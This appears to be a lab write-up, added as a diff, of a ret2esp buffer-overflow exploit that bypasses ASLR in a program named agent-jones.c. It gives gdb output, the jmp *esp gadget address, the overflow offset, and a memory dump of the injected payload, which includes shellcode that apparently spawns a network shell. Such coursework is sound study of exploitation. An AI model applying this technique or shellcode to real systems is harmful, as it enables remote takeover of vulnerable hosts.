@@ -1,0 +1,64 @@
+The vulnerability os that we can overflow the buffer. However, unlike in the previous parts, the addresses are changing because of ASLR, which means we can't provide a return address for the shellcode. 
+We saw that agent-jones.c contained the number 58623 and this gave us the idea to use the ret2esp method in 8.3 of the ASLR Smack & Laugh Reference. 58623 is equivalent to the hex number ffe4, which is interpreted as jmp *esp. By running disas magic we found the address of the orl instruction that uses the number 58623. There is an offset of 3 bytes and  this gives us the address of jmp *esp, which we use to overwrite the eip.
+We find the address of the buffer (using print &buf) and find that we need 2092 (0xbfffbcc - 0xbffff3a0) bytes to overwrite the eip.
+
+(gdb) p &buf
+$1 = (char (*)[2080]) 0xbffff3a0
+
+(gdb) info frame
+Stack level 0, frame at 0xbffffbd0:
+ eip = 0x80486fc in handle (agent-jones.c:39); saved eip 0x80488cc
+ called by frame at 0xbffffc30
+ source language c.
+ Arglist at 0xbffffbc8, args: client=8
+ Locals at 0xbffffbc8, Previous frame's sp is 0xbffffbd0
+ Saved registers:
+  ebp at 0xbffffbc8, eip at 0xbffffbcc
+
+
+(gdb) disas magic
+Dump of assembler code for function magic:
+   0x08048604 <+0>:     push   %ebp
+   0x08048605 <+1>:     mov    %esp,%ebp
+   0x08048607 <+3>:     mov    0xc(%ebp),%eax
+   0x0804860a <+6>:     shl    $0x3,%eax
+   0x0804860d <+9>:     xor    %eax,0x8(%ebp)
+   0x08048610 <+12>:    mov    0x8(%ebp),%eax
+   0x08048613 <+15>:    shl    $0x3,%eax
+   0x08048616 <+18>:    xor    %eax,0xc(%ebp)
+   0x08048619 <+21>:    orl    $0xe4ff,0x8(%ebp)
+   0x08048620 <+28>:    mov    0xc(%ebp),%ecx
+   0x08048623 <+31>:    mov    $0x3e0f83e1,%edx
+   0x08048628 <+36>:    mov    %ecx,%eax
+
+(gdb) x/i 0x0804861c
+   0x804861c <magic+24>:        jmp    *%esp
+
+(gdb) x/32x 0xbffffbc0
+0xbffffbc0:     0xb7fd2000      0x00000000      0xbffffc28      0x080488cc
+0xbffffbd0:     0x00000008      0xbffffbf4      0xbffffbf0      0xbffffc14
+0xbffffbe0:     0x00000004      0x08049ff4      0x00000002      0x08048465
+0xbffffbf0:     0x00000010      0x18ee0002      0x0100007f      0x00000000
+0xbffffc00:     0x00000000      0x11a40002      0x00000000      0x00000000
+0xbffffc10:     0x00000000      0x00000001      0x00000008      0x00000007
+0xbffffc20:     0x080488e0      0x00000000      0x00000000      0xb7e454d3
+0xbffffc30:     0x00000002      0xbffffcc4      0xbffffcd0      0xb7fdc858
+
+
+0xbffffb20:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb30:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb40:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb50:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb60:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb70:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb80:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb90:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffba0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffbb0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffbc0:     0x41414141      0x41414141      0x41414141      0x0804861c
+0xbffffbd0:     0xe3f7db31      0x6a534353      0xb0e18902      0x5b80cd66
+0xbffffbe0:     0x0268525e      0x6a0a1a00      0x89505110      0x58666ae1
+0xbffffbf0:     0x418980cd      0xb004b304      0x4380cd66      0x80cd66b0
+0xbffffc00:     0x3f6a5993      0x4980cd58      0x2f68f879      0x6868732f
+0xbffffc10:     0x6e69622f      0x5350e389      0x0bb0e189      0x000a80cd
+0xbffffc20:     0x080488e0      0x00000000      0x00000000      0xb7e454d3
